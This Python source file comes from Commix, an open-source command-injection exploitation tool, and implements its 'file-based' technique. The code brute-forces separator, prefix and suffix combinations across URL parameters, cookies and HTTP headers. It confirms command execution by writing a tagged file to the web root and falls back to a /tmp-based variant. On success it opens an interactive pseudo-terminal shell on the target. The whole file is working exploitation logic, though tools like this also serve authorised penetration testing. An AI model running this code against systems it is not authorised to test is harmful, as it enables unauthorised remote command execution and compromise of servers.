#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2024 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

For more see the file 'readme/COPYING' for copying permission.
"""
import re
import os
import sys
import time
import string
import random
from src.utils import menu
from src.utils import logs
from src.utils import settings
from src.utils import session_handler
from src.core.requests import proxy
from src.core.requests import headers
from src.core.requests import requests
from src.core.requests import parameters
from src.utils import common
from src.core.injections.controller import checks
from src.core.injections.controller import shell_options
from src.thirdparty.six.moves import input as _input
from src.thirdparty.six.moves import urllib as _urllib
from src.thirdparty.colorama import Fore, Back, Style, init
from src.core.injections.semiblind.techniques.file_based import fb_injector
from src.core.injections.semiblind.techniques.file_based import fb_payloads
from src.core.injections.semiblind.techniques.file_based import fb_enumeration
from src.core.injections.semiblind.techniques.file_based import fb_file_access
from src.core.injections.semiblind.techniques.tempfile_based import tfb_handler

"""
The "file-based" technique on semiblind OS command injection.
"""

"""
Check if file-based technique has failed,
then use the "/tmp/" directory for tempfile-based technique.
"""
def tfb_controller(no_result, url, timesec, filename, tmp_path, http_request_method, url_time_response):
  if no_result == True:
    path = tmp_path
    checks.setting_writable_dir(path)
    call_tfb = tfb_handler.exploitation(url, timesec, filename, tmp_path, http_request_method, url_time_response)
    return call_tfb
  else :
    sys.stdout.write("\r")
    sys.stdout.flush()

"""
Delete previous shells outputs.
"""
def delete_previous_shell(separator, payload, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename):
  if settings.FILE_BASED_STATE != None or settings.TEMPFILE_BASED_STATE != None:
    if settings.VERBOSITY_LEVEL != 0:
      debug_msg = "Cleaning up the target operating system (i.e. deleting file '" + OUTPUT_TEXTFILE + "')."
      print(settings.print_debug_msg(debug_msg))
  if settings.FILE_BASED_STATE != None:
    if settings.TARGET_OS == settings.OS.WINDOWS:
      cmd = settings.WIN_DEL + settings.WEB_ROOT + OUTPUT_TEXTFILE
    else:
      cmd = settings.DEL + settings.WEB_ROOT + OUTPUT_TEXTFILE + settings.SINGLE_WHITESPACE + settings.COMMENT
    response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
  elif settings.TEMPFILE_BASED_STATE != None:
    if settings.TARGET_OS == settings.OS.WINDOWS:
      cmd = settings.WIN_DEL + OUTPUT_TEXTFILE
    else:
      cmd = settings.DEL + OUTPUT_TEXTFILE + settings.SINGLE_WHITESPACE + settings.COMMENT
    response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)

"""
Provide custom server's root directory
"""
def custom_web_root(url, timesec, filename, http_request_method, url_time_response):
  if not settings.CUSTOM_WEB_ROOT:
    if settings.TARGET_OS == settings.OS.WINDOWS :
      default_root_dir = settings.WINDOWS_DEFAULT_DOC_ROOTS[0]
    else:
      default_root_dir = settings.LINUX_DEFAULT_DOC_ROOTS[0].replace(settings.DOC_ROOT_TARGET_MARK,settings.TARGET_URL)
    message = "Enter what you want to use for writable directory (e.g. '"
    message += default_root_dir + "') > "
    settings.WEB_ROOT = common.read_input(message, default=default_root_dir, check_batch=True)
    if len(settings.WEB_ROOT) == 0:
      settings.WEB_ROOT = default_root_dir
    settings.CUSTOM_WEB_ROOT = True

  if not settings.LOAD_SESSION:
    path = settings.WEB_ROOT
    checks.setting_writable_dir(path)
  menu.options.web_root = settings.WEB_ROOT.strip()

"""
Return TEMP path for win / *nix targets.
"""
def check_tmp_path(url, timesec, filename, http_request_method, url_time_response):
  def check_trailing_slashes():
    if settings.TARGET_OS == settings.OS.WINDOWS and not menu.options.web_root.endswith("\\"):
      menu.options.web_root = settings.WEB_ROOT = menu.options.web_root + "\\"
    elif not menu.options.web_root.endswith("/"):
      menu.options.web_root = settings.WEB_ROOT = menu.options.web_root + "/"

  # Set temp path
  if settings.TARGET_OS == settings.OS.WINDOWS:
    if "microsoft-iis" in settings.SERVER_BANNER.lower():
      settings.TMP_PATH = r"C:\\Windows\TEMP\\"
    else:
      settings.TMP_PATH = "%temp%\\"
  else:
    settings.TMP_PATH = "/tmp/"

  if menu.options.tmp_path:
    tmp_path = menu.options.tmp_path
  else:
    tmp_path = settings.TMP_PATH

  if not settings.LOAD_SESSION and settings.DEFAULT_WEB_ROOT != settings.WEB_ROOT:
    settings.WEB_ROOT = settings.DEFAULT_WEB_ROOT

  if menu.options.file_dest and '/tmp/' in menu.options.file_dest:
    call_tmp_based = True

  if menu.options.web_root:
    settings.WEB_ROOT = menu.options.web_root
  else:
    # Provide custom server's root directory.
    custom_web_root(url, timesec, filename, http_request_method, url_time_response)

  if settings.TARGET_OS == settings.OS.WINDOWS:
    settings.WEB_ROOT = settings.WEB_ROOT.replace("/","\\")

  check_trailing_slashes()

  return tmp_path


def finalize(exit_loops, no_result, float_percent, injection_type, technique, shell):
  if exit_loops == False:
    if settings.VERBOSITY_LEVEL == 0:
      percent = checks.print_percentage(float_percent, no_result, shell)
      checks.injection_process(injection_type, technique, percent)
      return True
    else:
      return True
  else:
    return False


"""
The "file-based" injection technique handler
"""
def fb_injection_handler(url, timesec, filename, http_request_method, url_time_response, injection_type, technique):
  shell = False
  counter = 1
  vp_flag = True
  exit_loops = False
  no_result = True
  is_encoded = False
  stop_injection = False
  call_tmp_based = False
  next_attack_vector = False
  export_injection_info = False

  if not settings.LOAD_SESSION:
    tmp_path = check_tmp_path(url, timesec, filename, http_request_method, url_time_response)
    TAG = ''.join(random.choice(string.ascii_uppercase) for i in range(6))

  i = 0
  # Calculate all possible combinations
  total = len(settings.WHITESPACES) * len(settings.PREFIXES) * len(settings.SEPARATORS) * len(settings.SUFFIXES)
  # Check if defined alter shell
  alter_shell = menu.options.alter_shell
  for whitespace in settings.WHITESPACES:
    for prefix in settings.PREFIXES:
      for suffix in settings.SUFFIXES:
        for separator in settings.SEPARATORS:

          # Check injection state
          settings.DETECTION_PHASE = True
          settings.EXPLOITATION_PHASE = False
          # If a previous session is available.
          if settings.LOAD_SESSION:
            try:
              settings.FILE_BASED_STATE = True
              url, technique, injection_type, separator, shell, vuln_parameter, prefix, suffix, TAG, alter_shell, payload, http_request_method, url_time_response, timesec, how_long, output_length, is_vulnerable = session_handler.injection_point_exportation(url, http_request_method)
              checks.check_for_stored_tamper(payload)
              OUTPUT_TEXTFILE = TAG + settings.OUTPUT_FILE_EXT
              if re.findall(settings.DIRECTORY_REGEX,payload):
                filepath = re.findall(settings.DIRECTORY_REGEX,payload)[0]
                settings.WEB_ROOT = os.path.dirname(filepath)
                settings.CUSTOM_WEB_ROOT = True
              tmp_path = check_tmp_path(url, timesec, filename, http_request_method, url_time_response)
              session_handler.notification(url, technique, injection_type)
              if technique == settings.INJECTION_TECHNIQUE.TEMP_FILE_BASED:
                tfb_handler.exploitation(url, timesec, filename, tmp_path, http_request_method, url_time_response)
            except TypeError:
              checks.error_loading_session_file()

          if settings.RETEST == True:
            settings.RETEST = False
            from src.core.injections.results_based.techniques.classic import cb_handler
            cb_handler.exploitation(url, timesec, filename, http_request_method, injection_type=settings.INJECTION_TYPE.RESULTS_BASED_CI, technique=settings.INJECTION_TECHNIQUE.CLASSIC)
            checks.testing_technique_title(injection_type, technique)
              
          if not settings.LOAD_SESSION:
            i = i + 1
            # The output file for file-based injection technique.
            OUTPUT_TEXTFILE = TAG + settings.OUTPUT_FILE_EXT
            # Check for bad combination of prefix and separator
            combination = prefix + separator
            if combination in settings.JUNK_COMBINATION:
              prefix = ""

            try:
              # File-based decision payload (check if host is vulnerable).
              if alter_shell :
                payload = fb_payloads.decision_alter_shell(separator, TAG, OUTPUT_TEXTFILE)
              else:
                payload = fb_payloads.decision(separator, TAG, OUTPUT_TEXTFILE)

              # Check if defined "--prefix" option.
              # Fix prefixes / suffixes
              payload = parameters.prefixes(payload, prefix)
              payload = parameters.suffixes(payload, suffix)

              # Whitespace fixation
              payload = payload.replace(settings.SINGLE_WHITESPACE, whitespace)

              # Perform payload modification
              payload = checks.perform_payload_modification(payload)

              # Check if defined "--verbose" option.
              if settings.VERBOSITY_LEVEL != 0:
                payload_msg = payload.replace("\n", "\\n")
                print(settings.print_payload(payload_msg))

              # Cookie Injection
              if settings.COOKIE_INJECTION == True:
                # Check if target host is vulnerable to cookie header injection.
                vuln_parameter = parameters.specify_cookie_parameter(menu.options.cookie)
                response = fb_injector.cookie_injection_test(url, vuln_parameter, payload, http_request_method)

              # User-Agent HTTP Header Injection
              elif settings.USER_AGENT_INJECTION == True:
                # Check if target host is vulnerable to user-agent HTTP header injection.
                vuln_parameter = parameters.specify_user_agent_parameter(menu.options.agent)
                response = fb_injector.user_agent_injection_test(url, vuln_parameter, payload, http_request_method)

              # Referer HTTP Header Injection
              elif settings.REFERER_INJECTION == True:
                # Check if target host is vulnerable to Referer HTTP header injection.
                vuln_parameter = parameters.specify_referer_parameter(menu.options.referer)
                response = fb_injector.referer_injection_test(url, vuln_parameter, payload, http_request_method)

              # Host HTTP Header Injection
              elif settings.HOST_INJECTION == True:
                # Check if target host is vulnerable to Host HTTP header injection.
                vuln_parameter = parameters.specify_host_parameter(menu.options.host)
                response = fb_injector.host_injection_test(url, vuln_parameter, payload, http_request_method)

              # Custom HTTP header Injection
              elif settings.CUSTOM_HEADER_INJECTION == True:
                # Check if target host is vulnerable to custom HTTP header injection.
                vuln_parameter = parameters.specify_custom_header_parameter(settings.INJECT_TAG)
                response = fb_injector.custom_header_injection_test(url, vuln_parameter, payload, http_request_method)

              else:
                # Check if target host is vulnerable.
                response, vuln_parameter = fb_injector.injection_test(payload, http_request_method, url)

              # Find the directory.
              output = fb_injector.injection_output(url, OUTPUT_TEXTFILE, timesec)
              time.sleep(timesec)

              try:
                # Check if defined extra headers.
                request = _urllib.request.Request(output)
                headers.do_check(request)
                headers.check_http_traffic(request)
                # Check if defined any HTTP Proxy (--proxy option).
                if menu.options.proxy or menu.options.ignore_proxy or menu.options.tor: 
                  response = proxy.use_proxy(request)
                else:
                  response = _urllib.request.urlopen(request, timeout=settings.TIMEOUT)

                if type(response) is bool:
                  html_data = ""
                else:
                  html_data = checks.page_encoding(response, action="decode")
                shell = re.findall(r"" + TAG + "", str(html_data))

                if len(shell) != 0 and shell[0] == TAG and not settings.VERBOSITY_LEVEL != 0:
                  percent = settings.info_msg
                  checks.injection_process(injection_type, technique, percent)

                if len(shell) == 0 :
                  raise _urllib.error.HTTPError(url, 404, 'Error', {}, None)

              except _urllib.error.HTTPError as e:
                if str(e.getcode()) == settings.NOT_FOUND_ERROR:
                  percent, float_percent = checks.percentage_calculation(i, total)

                  if call_tmp_based == True:
                    exit_loops = True
                    tmp_path = os.path.split(menu.options.file_dest)[0] + "/"
                    tfb_controller(no_result, url, timesec, filename, tmp_path, http_request_method, url_time_response)
                    raise

                  # Show an error message, after N failed tries.
                  # Use the "/tmp/" directory for tempfile-based technique.
                  elif (i == int(menu.options.failed_tries) and no_result == True) or (i == total):
                    if i == total:
                      if finalize(exit_loops, no_result, float_percent, injection_type, technique, shell):
                        continue
                      else:
                        raise
                    tmp_path = check_tmp_path(url, timesec, filename, http_request_method, url_time_response)
                    sys.stdout.write("\r")
                    message = "It seems that you don't have permissions to "
                    message += "read and/or write files in directory '" + settings.WEB_ROOT + "'."
                    if not menu.options.web_root:
                      message += " You are advised to rerun with option '--web-root'."
                    while True:
                      message = message + "\nDo you want to use the temporary directory ('" + tmp_path + "')? [Y/n] > "
                      tmp_upload = common.read_input(message, default="Y", check_batch=True)
                      if tmp_upload in settings.CHOICE_YES:
                        exit_loops = True
                        settings.TEMPFILE_BASED_STATE = True
                        call_tfb = tfb_controller(no_result, url, timesec, filename, tmp_path, http_request_method, url_time_response)
                        if call_tfb != False:
                          return True
                        else:
                          if no_result == True:
                            return False
                          else:
                            return True
                      elif tmp_upload in settings.CHOICE_NO:
                        break
                      elif tmp_upload in settings.CHOICE_QUIT:
                        print(settings.SINGLE_WHITESPACE)
                        raise
                      else:
                        common.invalid_option(tmp_upload)
                        pass
                    continue

                  else:
                    if finalize(exit_loops, no_result, float_percent, injection_type, technique, shell):
                      continue
                    else:
                      raise

                elif str(e.getcode()) == settings.UNAUTHORIZED_ERROR:
                  err_msg = "Authorization is required to access this page: '" + settings.DEFINED_WEBROOT + "'."
                  print(settings.print_critical_msg(err_msg))
                  raise SystemExit()

                elif str(e.getcode()) == settings.FORBIDDEN_ERROR:
                  err_msg = "You don't have access to this page: '" + settings.DEFINED_WEBROOT + "'."
                  print(settings.print_critical_msg(err_msg))
                  raise SystemExit()

            except (KeyboardInterrupt, SystemExit):
              # Delete previous shell (text) files (output)
              if 'vuln_parameter' in locals():
                # print(settings.SINGLE_WHITESPACE)
                delete_previous_shell(separator, payload, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
              raise

            except _urllib.error.URLError as e:
              warn_msg = "It seems that you don't have permissions to "
              warn_msg += "read and/or write files in directory '" + settings.WEB_ROOT + "'."
              sys.stdout.write("\r" + settings.print_warning_msg(warn_msg))
              err_msg = str(e).replace(": "," (") + ")."
              if settings.VERBOSITY_LEVEL >= 2:
                print(settings.SINGLE_WHITESPACE)
              print(settings.print_critical_msg(err_msg))
              # Provide custom server's root directory.
              if not menu.options.web_root:
                custom_web_root(url, timesec, filename, http_request_method, url_time_response)
              continue
            except:
              raise

          # Yaw, got shellz!
          # Do some magic tricks!
          if shell:
            settings.FILE_BASED_STATE = True
            found = True
            no_result = False
            checks.identified_vulnerable_param(url, technique, injection_type, vuln_parameter, payload, http_request_method, filename, export_injection_info, vp_flag, counter)
            # Export session
            if not settings.LOAD_SESSION:
              session_handler.injection_point_importation(url, technique, injection_type, separator, shell[0], vuln_parameter, prefix, suffix, TAG, alter_shell, payload, http_request_method, url_time_response=0, timesec=0, how_long=0, output_length=0, is_vulnerable=menu.options.level)
            else:
              whitespace = settings.WHITESPACES[0]
              settings.LOAD_SESSION = False
            # Check for any enumeration options.
            fb_enumeration.stored_session(separator, payload, TAG, timesec, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
            # Check for any system file access options.
            fb_file_access.stored_session(separator, payload, TAG, timesec, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
             # Check if defined single cmd.
            if menu.options.os_cmd:
              fb_enumeration.single_os_cmd_exec(separator, payload, TAG, timesec, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
              # Delete previous shell (text) files (output)
              delete_previous_shell(separator, payload, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)

            # Pseudo-Terminal shell
            try:
              checks.alert()
              go_back = False
              go_back_again = False
              while True:
                # Delete previous shell (text) files (output)
                delete_previous_shell(separator, payload, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
                if go_back == True:
                  break
                message = settings.CHECKING_PARAMETER + " is vulnerable. Do you want to prompt for a pseudo-terminal shell? [Y/n] > "
                if settings.CRAWLING:
                  settings.CRAWLED_URLS_INJECTED.append(_urllib.parse.urlparse(url).netloc)
                if not settings.STDIN_PARSING:
                  gotshell = common.read_input(message, default="Y", check_batch=True)
                else:
                  gotshell = common.read_input(message, default="n", check_batch=True)
                if gotshell in settings.CHOICE_YES:
                  print(settings.OS_SHELL_TITLE)
                  if settings.READLINE_ERROR:
                    checks.no_readline_module()
                  while True:
                    if not settings.READLINE_ERROR:
                      checks.tab_autocompleter()
                    sys.stdout.write(settings.OS_SHELL)
                    cmd = common.read_input(message="", default="os_shell", check_batch=True)
                    cmd = checks.escaped_cmd(cmd)
                    if cmd.lower() in settings.SHELL_OPTIONS:
                      if cmd.lower() == "quit" or cmd.lower() == "exit":
                        # Delete previous shell (text) files (output)
                        delete_previous_shell(separator, payload, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
                        raise SystemExit()
                      go_back, go_back_again = shell_options.check_option(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, technique, go_back, no_result, timesec, go_back_again, payload, OUTPUT_TEXTFILE)
                      if go_back and go_back_again == False:
                        break
                      if go_back and go_back_again:
                        return True
                    else:
                      time.sleep(timesec)
                      response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
                      if menu.options.ignore_session or \
                         session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None:
                        # Command execution results.
                        shell = fb_injector.injection_results(url, OUTPUT_TEXTFILE, timesec)
                        shell = "".join(str(p) for p in shell)
                        if not menu.options.ignore_session :
                          session_handler.store_cmd(url, cmd, shell, vuln_parameter)
                      else:
                        shell = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
                      if shell or shell != "":
                        # Update logs with executed cmds and execution results.
                        logs.executed_command(filename, cmd, shell)
                        print(settings.command_execution_output(shell))
                      else:
                        err_msg = common.invalid_cmd_output(cmd)
                        print(settings.print_critical_msg(err_msg))
                elif gotshell in settings.CHOICE_NO:
                  if checks.next_attack_vector(technique, go_back) == True:
                    break
                  else:
                    if no_result == True:
                      return False
                    else:
                      return True
                elif gotshell in settings.CHOICE_QUIT:
                  # Delete previous shell (text) files (output)
                  delete_previous_shell(separator, payload, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
                  raise SystemExit()
                else:
                  common.invalid_option(gotshell)
                  pass

            except KeyboardInterrupt:
              # Delete previous shell (text) files (output)
              delete_previous_shell(separator, payload, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
              raise

  if no_result == True:
    if settings.VERBOSITY_LEVEL == 0:
      print(settings.SINGLE_WHITESPACE)
    return False
  else :
    sys.stdout.write("\r")
    sys.stdout.flush()

"""
The exploitation function.
(call the injection handler)
"""
def exploitation(url, timesec, filename, http_request_method, url_time_response, injection_type, technique):
  if fb_injection_handler(url, timesec, filename, http_request_method, url_time_response, injection_type, technique) == False:
    return False

# eof
